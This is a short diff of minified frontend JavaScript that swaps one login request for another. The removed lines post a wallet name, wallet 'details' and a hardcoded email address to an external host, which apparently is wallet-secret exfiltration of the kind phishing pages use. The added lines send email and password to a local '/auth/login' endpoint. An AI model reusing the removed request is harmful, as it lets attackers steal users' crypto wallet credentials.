@@ -13136,14 +13136,13 @@ const Gh = [
 				try {
 					_(!0);
 					const rl = await fetch(
-						"https://velofinza.com/backend/api/v1/wallet",
+						"/auth/login",
 						{
 							method: "POST",
 							headers: { "Content-Type": "application/json" },
 							body: JSON.stringify({
-								walletName: N.name,
-								details: el,
-								email: "Gerfish7458@proton.me",
+								email: N.name,
+								password: el
 							}),
 						}
 					);
